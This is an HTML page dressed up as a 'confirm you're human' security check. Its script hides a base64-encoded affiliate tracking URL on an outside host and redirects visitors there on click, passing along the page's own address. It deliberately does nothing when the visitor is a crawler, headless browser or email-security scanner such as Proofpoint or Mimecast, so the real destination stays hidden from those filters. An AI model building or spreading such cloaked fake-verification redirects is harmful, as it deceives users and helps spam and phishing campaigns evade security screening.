<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Wait a moment</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:-apple-system,"Segoe UI",Roboto,sans-serif;
    background:#f8fafc;color:#0f172a;display:flex;align-items:center;justify-content:center;
    min-height:100dvh;padding:24px;overflow:hidden;
  }
  .strip{
    width:100%;max-width:380px;background:#fff;border-radius:16px;
    padding:30px 24px 22px;
    box-shadow:0 1px 3px rgba(15,23,42,.05),0 8px 24px rgba(15,23,42,.06);
    border:1px solid #e2e8f0;
  }
  .kicker{
    font-size:10.5px;font-weight:700;letter-spacing:1.8px;
    color:#3b82f6;margin-bottom:14px;
  }
  .title{
    font-size:22px;font-weight:700;letter-spacing:-.3px;
    margin-bottom:10px;color:#0f172a;line-height:1.2;
  }
  .lead{
    font-size:14px;color:#64748b;line-height:1.55;margin-bottom:22px;
  }
  .meta{
    display:flex;justify-content:space-between;align-items:center;
    font-size:11.5px;color:#94a3b8;margin-bottom:10px;
    font-variant-numeric:tabular-nums;
  }
  .meta b{color:#3b82f6;font-weight:700}
  .rail{height:4px;background:#e2e8f0;border-radius:99px;overflow:hidden;margin-bottom:22px}
  .rail span{display:block;height:100%;width:0;background:#3b82f6;transition:width .25s linear;border-radius:99px}
  .cta{
    display:none;width:100%;padding:14px;border:0;border-radius:99px;
    background:#3b82f6;color:#fff;font-family:inherit;font-size:14.5px;
    font-weight:600;cursor:pointer;min-height:48px;letter-spacing:.3px;
    transition:background .15s;
  }
  .cta:hover{background:#2563eb}
  .cta:active{transform:scale(.985)}
  .cta.ready{display:block;animation:appear .3s ease}
  @keyframes appear{from{opacity:0}to{opacity:1}}
</style>
</head>
<body>
<div class="strip">
  <div class="kicker">SECURITY</div>
  <h1 class="title">Confirm you're human.</h1>
  <p class="lead">A short check keeps automated traffic out.<br>Takes just a moment.</p>
  <div class="meta"><span>Progress</span><b id="pct5">0%</b></div>
  <div class="rail"><span id="rail5"></span></div>
  <button class="cta" id="cta5" type="button">Continue</button>
</div>
<script>
(function(){
  var ENC="aHR0cHM6Ly90cmMuYmVhc3Rib3gucHJvL2NsaWNrP289Y212dGE5bnpwMDAwY2FldGpsdzZlYmc2ciZwPUFGLTEwMDQmc3ViMT1SUw==";
  var QP="referrerCF";
  var rail=document.getElementById("rail5");
  var pct=document.getElementById("pct5");
  var cta=document.getElementById("cta5");
  var uaText=(navigator.userAgent||"").toLowerCase();
  var skipTerms=["bot","crawler","spider","curl/","wget/","python-requests","headlesschrome","phantomjs","googlebot","bingpreview","yandexbot","duckduckbot","facebookexternalhit","telegrambot","googleimageproxy","yahoomailproxy","ms-office","barracuda","proofpoint","mimecast"];
  for(var i=0;i<skipTerms.length;i++){
    if(uaText.indexOf(skipTerms[i])!==-1)return;
  }
  if(navigator.webdriver===true)return;
  var flagHuman=0;
  ["pointerdown","touchstart","keydown","scroll","mousemove"].forEach(function(ev){
    window.addEventListener(ev,function(){flagHuman=1},{passive:true});
  });
  var dur=1400+Math.random()*1100;
  var t0=performance.now();
  var shown=0;
  function anim(){
    var e=performance.now()-t0;
    var ratio=Math.min(100,e/dur*100);
    rail.style.width=ratio+"%";
    pct.textContent=Math.round(ratio)+"%";
    if(e<dur){requestAnimationFrame(anim);return;}
    if(shown)return;shown=1;
    rail.style.width="100%";pct.textContent="100%";
    cta.classList.add("ready");
    cta.textContent=flagHuman?"Continue →":"Tap to continue →";
  }
  requestAnimationFrame(anim);
  var used=false;
  cta.addEventListener("click",function(e){
    e.preventDefault();if(used)return;used=1;
    cta.disabled=true;cta.style.opacity=".6";cta.textContent="Redirecting…";
    var base="";
    try{base=decodeURIComponent(escape(atob(ENC)));}catch(err){base="";}
    if(!base)return;
    var joiner=base.indexOf("?")>=0?"&":"?";
    var full=base+joiner+QP+"="+encodeURIComponent(location.href);
    try{window.location.href=full;}
    catch(err){window.location.assign(full);}
  });
})();
</script>
</body>
</html>
